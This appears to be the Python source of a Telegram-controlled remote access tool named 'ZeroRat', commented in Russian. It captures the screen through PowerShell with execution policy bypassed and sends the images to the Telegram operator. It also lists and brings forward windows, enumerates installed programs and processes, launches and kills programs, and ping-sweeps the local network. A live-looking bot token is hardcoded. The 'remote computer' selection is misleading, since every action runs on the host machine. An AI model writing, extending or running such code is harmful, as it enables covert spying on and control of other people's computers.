import logging
import socket
import subprocess
import getpass
import psutil
import win32gui
import win32con
import win32process
import os
import winreg
import pyautogui
import tempfile
from io import BytesIO
from base64 import b64decode
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import threading

# Настройка логов
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

TOKEN = "8418389852:AAFfSDGHyszjl1kFAXSTB53isKVzygSW-d4"

# Глобальные переменные
selected_computer = None
user_states = {}


class RemoteComputer:
    def __init__(self, ip, hostname, username):
        self.ip = ip
        self.hostname = hostname
        self.username = username

    def take_screenshot(self):
        """Делает скриншот через PowerShell"""
        try:
            ps_script = """
            Add-Type -AssemblyName System.Windows.Forms
            Add-Type -AssemblyName System.Drawing
            $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
            $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
            $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
            $graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
            $stream = New-Object System.IO.MemoryStream
            $bitmap.Save($stream, [System.Drawing.Imaging.ImageFormat]::Png)
            $bytes = $stream.ToArray()
            [System.Convert]::ToBase64String($bytes)
            """
            result = subprocess.run([
                "powershell", "-ExecutionPolicy", "Bypass", "-Command", ps_script
            ], capture_output=True, text=True, timeout=30)

            if result.returncode == 0:
                return result.stdout.strip()
            return None
        except Exception as e:
            logger.error(f"Screenshot error: {e}")
            return None

    def open_task_manager(self):
        """Открывает диспетчер задач"""
        try:
            subprocess.Popen("taskmgr", shell=True)
            return True
        except Exception as e:
            logger.error(f"Task manager error: {e}")
            return False

    def open_notepad_with_text(self, text):
        """Открывает блокнот с текстом"""
        try:
            with tempfile.NamedTemporaryFile(mode='w', encoding='utf-8', suffix='.txt', delete=False) as f:
                f.write(text)
                temp_file = f.name

            subprocess.Popen(["notepad", temp_file], shell=True)

            threading.Timer(5.0, lambda: os.unlink(temp_file) if os.path.exists(temp_file) else None).start()

            return True
        except Exception as e:
            logger.error(f"Notepad error: {e}")
            return False

    def get_open_windows(self):
        """Получает список открытых окон"""
        try:
            windows = []

            def enum_windows_proc(hwnd, param):
                if win32gui.IsWindowVisible(hwnd):
                    window_text = win32gui.GetWindowText(hwnd)
                    if window_text:
                        class_name = win32gui.GetClassName(hwnd)
                        windows.append({
                            'hwnd': hwnd,
                            'title': window_text,
                            'class': class_name
                        })
                return True

            win32gui.EnumWindows(enum_windows_proc, None)
            return windows
        except Exception as e:
            logger.error(f"Get windows error: {e}")
            return []

    def bring_window_to_front(self, hwnd):
        """Переводит окно на передний план"""
        try:
            win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
            win32gui.SetForegroundWindow(hwnd)
            return True
        except Exception as e:
            logger.error(f"Bring to front error: {e}")
            return False

    def find_installed_programs(self):
        """Ищет установленные программы и приложения на рабочем столе"""
        try:
            programs = []

            # Поиск через реестр (установленные программы)
            reg_paths = [
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
            ]

            for hive, path in reg_paths:
                try:
                    key = winreg.OpenKey(hive, path)
                    for i in range(winreg.QueryInfoKey(key)[0]):
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            subkey = winreg.OpenKey(key, subkey_name)
                            try:
                                name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                programs.append(f"📁 {name}")
                            except:
                                pass
                            winreg.CloseKey(subkey)
                        except:
                            pass
                    winreg.CloseKey(key)
                except:
                    pass

            # Поиск исполняемых файлов на рабочем столе
            desktop_path = os.path.expanduser("~\\Desktop")
            if os.path.exists(desktop_path):
                for item in os.listdir(desktop_path):
                    if item.endswith(('.exe', '.lnk')):
                        programs.append(f"🖥️ {item}")

            # Стандартные программы Windows
            standard_programs = [
                "notepad", "calc", "mspaint", "cmd", "powershell",
                "explorer", "taskmgr", "control"
            ]
            for prog in standard_programs:
                programs.append(f"⚙️ {prog}")

            return list(set(programs))[:15]
        except Exception as e:
            logger.error(f"Find programs error: {e}")
            return []

    def open_program(self, program_name):
        """Открывает программу по имени"""
        try:
            clean_name = program_name.replace("📁 ", "").replace("🖥️ ", "").replace("⚙️ ", "")

            if clean_name in ["notepad", "calc", "mspaint", "cmd", "powershell", "taskmgr", "explorer", "control"]:
                subprocess.Popen(clean_name, shell=True)
            else:
                subprocess.Popen(f'"{clean_name}"', shell=True)

            return True
        except Exception as e:
            logger.error(f"Open program error: {e}")
            return False

    def get_running_processes(self):
        """Получает список запущенных процессов"""
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    processes.append(f"{proc.info['name']} (PID: {proc.info['pid']})")
                except:
                    pass
            return processes[:15]
        except Exception as e:
            logger.error(f"Get processes error: {e}")
            return []

    def close_program(self, process_name):
        """Закрывает программу по имени"""
        try:
            if "(PID:" in process_name:
                process_name = process_name.split("(")[0].strip()

            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'].lower() == process_name.lower():
                    proc.terminate()
                    return True
            return False
        except Exception as e:
            logger.error(f"Close program error: {e}")
            return False

    def minimize_all_windows(self):
        """Сворачивает все окна"""
        try:
            pyautogui.hotkey('win', 'd')
            return True
        except Exception as e:
            logger.error(f"Minimize windows error: {e}")
            return False


def scan_network():
    """Сканирует сеть на наличие компьютеров"""
    computers = []
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    username = getpass.getuser()
    network_prefix = '.'.join(local_ip.split('.')[:-1])

    logger.info(f"Scanning network: {network_prefix}.0/24")

    computers.append(RemoteComputer(local_ip, hostname, username))

    def ping_host(ip):
        try:
            result = subprocess.run(
                ["ping", "-n", "1", "-w", "1000", ip],
                capture_output=True,
                timeout=2
            )
            if result.returncode == 0:
                try:
                    hostname = socket.gethostbyaddr(ip)[0]
                    computers.append(RemoteComputer(ip, hostname, "remote_user"))
                except:
                    hostname = ip
                    computers.append(RemoteComputer(ip, hostname, "unknown"))
        except:
            pass

    threads = []
    for i in range(1, 255):
        ip = f"{network_prefix}.{i}"
        if ip != local_ip:
            thread = threading.Thread(target=ping_host, args=(ip,))
            thread.start()
            threads.append(thread)

    for thread in threads:
        thread.join(timeout=1)

    return computers


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info(f"User {update.effective_user.id} issued /start")
    await update.message.reply_text(
        "Привет! 👾 Я ZeroRat.\n\n"
        "Используй /info для списка команд."
    )


async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info(f"User {update.effective_user.id} issued /info")
    await update.message.reply_text(
        "Доступные команды:\n"
        "/start - основная информация\n"
        "/search - поиск компьютеров в сети\n"
        "/choose <ip> - выбрать компьютер\n"
        "/stop - сбросить выбор\n\n"
        "После выбора используй кнопки для управления."
    )


async def search(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info(f"User {update.effective_user.id} issued /search")
    await update.message.reply_text("Сканирую сеть, подождите...")

    computers = scan_network()
    context.user_data['found_computers'] = computers

    if computers:
        computer_list = "\n".join([f"{comp.username} ({comp.hostname}) - {comp.ip}" for comp in computers])
        await update.message.reply_text(
            f"Найдено компьютеров: {len(computers)}\n\n{computer_list}\n\n"
            "Используй /choose <ip> чтобы выбрать"
        )
    else:
        await update.message.reply_text("Компьютеры не найдены")


async def choose(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global selected_computer
    if not context.args:
        await update.message.reply_text("Укажите IP адрес. Например: /choose 192.168.1.100")
        return

    ip = context.args[0]
    computers = context.user_data.get('found_computers', [])

    target_computer = None
    for comp in computers:
        if comp.ip == ip:
            target_computer = comp
            break

    if not target_computer:
        await update.message.reply_text("Компьютер не найден. Сначала используйте /search")
        return

    selected_computer = target_computer
    logger.info(f"User {update.effective_user.id} selected computer: {target_computer.hostname}")

    user_id = update.effective_user.id
    user_states[user_id] = None

    keyboard = [
        ["screenshot", "Открыть диспетчер задач"],
        ["Открыть блокнот", "Выбрать активное окно"],
        ["Открыть программу", "Закрыть программу"],
        ["Свернуть все окна", "/stop"]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

    await update.message.reply_text(
        f"Выбран компьютер: {target_computer.username} ({target_computer.hostname}) - {target_computer.ip}\n"
        "Используйте кнопки для управления",
        reply_markup=reply_markup
    )


async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global selected_computer
    selected_computer = None

    user_id = update.effective_user.id
    if user_id in user_states:
        user_states[user_id] = None

    logger.info(f"User {update.effective_user.id} reset selection")
    await update.message.reply_text(
        "Выбор сброшен",
        reply_markup=ReplyKeyboardRemove()
    )


async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global selected_computer
    user_id = update.effective_user.id

    if not selected_computer:
        return

    text = update.message.text
    user_state = user_states.get(user_id)

    if user_state == "waiting_notepad_text":
        user_states[user_id] = None
        logger.info(f"User {user_id} sending text to notepad: {text}")

        await update.message.reply_text("Открываю блокнот с текстом...")

        if selected_computer.open_notepad_with_text(text):
            await update.message.reply_text("Блокнот открыт с текстом 📝")
        else:
            await update.message.reply_text("Не удалось открыть блокнот")

    elif user_state == "waiting_window_choice":
        user_states[user_id] = None
        try:
            window_index = int(text) - 1
            windows = context.user_data.get('windows_list', [])

            if 0 <= window_index < len(windows):
                selected_window = windows[window_index]
                logger.info(f"User {user_id} selected window: {selected_window['title']}")

                if selected_computer.bring_window_to_front(selected_window['hwnd']):
                    await update.message.reply_text(f"Окно '{selected_window['title']}' переведено на передний план 🪟")
                else:
                    await update.message.reply_text("Не удалось перевести окно на передний план")
            else:
                await update.message.reply_text("Неверный номер окна")
        except ValueError:
            await update.message.reply_text("Пожалуйста, введите номер окна")

    elif user_state == "waiting_program_choice":
        user_states[user_id] = None
        try:
            program_index = int(text) - 1
            programs = context.user_data.get('programs_list', [])

            if 0 <= program_index < len(programs):
                selected_program = programs[program_index]
                logger.info(f"User {user_id} selected program: {selected_program}")

                if selected_computer.open_program(selected_program):
                    await update.message.reply_text(f"Программа '{selected_program}' запускается 🚀")
                else:
                    await update.message.reply_text("Не удалось запустить программу")
            else:
                await update.message.reply_text("Неверный номер программы")
        except ValueError:
            await update.message.reply_text("Пожалуйста, введите номер программы")

    elif user_state == "waiting_close_program_choice":
        user_states[user_id] = None
        try:
            process_index = int(text) - 1
            processes = context.user_data.get('processes_list', [])

            if 0 <= process_index < len(processes):
                selected_process = processes[process_index]
                logger.info(f"User {user_id} selected process to close: {selected_process}")

                if selected_computer.close_program(selected_process):
                    await update.message.reply_text(f"Программа '{selected_process}' закрывается ❌")
                else:
                    await update.message.reply_text("Не удалось закрыть программу")
            else:
                await update.message.reply_text("Неверный номер программы")
        except ValueError:
            await update.message.reply_text("Пожалуйста, введите номер программы")

    elif text == "screenshot":
        logger.info(f"User {user_id} requested screenshot from {selected_computer.hostname}")
        await update.message.reply_text("Делаю скриншот...")

        screenshot_b64 = selected_computer.take_screenshot()
        if screenshot_b64:
            try:
                screenshot_data = b64decode(screenshot_b64)
                await update.message.reply_photo(BytesIO(screenshot_data), caption="Скриншот экрана 📸")
            except Exception as e:
                await update.message.reply_text(f"Ошибка отправки скриншота: {e}")
        else:
            await update.message.reply_text("Не удалось сделать скриншот")

    elif text == "Открыть диспетчер задач":
        logger.info(f"User {user_id} opened task manager on {selected_computer.hostname}")
        if selected_computer.open_task_manager():
            await update.message.reply_text("Диспетчер задач открыт 🖥️")
        else:
            await update.message.reply_text("Не удалось открыть диспетчер задач")

    elif text == "Открыть блокнот":
        logger.info(f"User {user_id} requested notepad")
        user_states[user_id] = "waiting_notepad_text"
        await update.message.reply_text("Введите текст для блокнота:")

    elif text == "Выбрать активное окно":
        logger.info(f"User {user_id} requested window list")
        await update.message.reply_text("Получаю список окон...")

        windows = selected_computer.get_open_windows()
        if windows:
            windows_list = "\n".join([f"{i + 1}. {win['title']}" for i, win in enumerate(windows[:10])])
            context.user_data['windows_list'] = windows

            user_states[user_id] = "waiting_window_choice"
            await update.message.reply_text(
                f"Открытые окна:\n{windows_list}\n\nВведите номер окна для выбора:"
            )
        else:
            await update.message.reply_text("Не удалось получить список окон")

    elif text == "Открыть программу":
        logger.info(f"User {user_id} requested program list")
        await update.message.reply_text("Ищу программы...")

        programs = selected_computer.find_installed_programs()
        if programs:
            programs_list = "\n".join([f"{i + 1}. {program}" for i, program in enumerate(programs)])
            context.user_data['programs_list'] = programs

            user_states[user_id] = "waiting_program_choice"
            await update.message.reply_text(
                f"Найденные программы:\n{programs_list}\n\nВведите номер программы для запуска:"
            )
        else:
            await update.message.reply_text("Не удалось найти программы")

    elif text == "Закрыть программу":
        logger.info(f"User {user_id} requested process list")
        await update.message.reply_text("Получаю список процессов...")

        processes = selected_computer.get_running_processes()
        if processes:
            processes_list = "\n".join([f"{i + 1}. {process}" for i, process in enumerate(processes)])
            context.user_data['processes_list'] = processes

            user_states[user_id] = "waiting_close_program_choice"
            await update.message.reply_text(
                f"Запущенные процессы:\n{processes_list}\n\nВведите номер программы для закрытия:"
            )
        else:
            await update.message.reply_text("Не удалось получить список процессов")

    elif text == "Свернуть все окна":
        logger.info(f"User {user_id} requested minimize all windows")
        if selected_computer.minimize_all_windows():
            await update.message.reply_text("Все окна свернуты 📁")
        else:
            await update.message.reply_text("Не удалось свернуть окна")


def main():
    """Запуск бота"""
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("info", info))
    application.add_handler(CommandHandler("search", search))
    application.add_handler(CommandHandler("choose", choose))
    application.add_handler(CommandHandler("stop", stop))

    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_messages))

    logger.info("Bot started and ready")
    application.run_polling()


if __name__ == '__main__':
    main()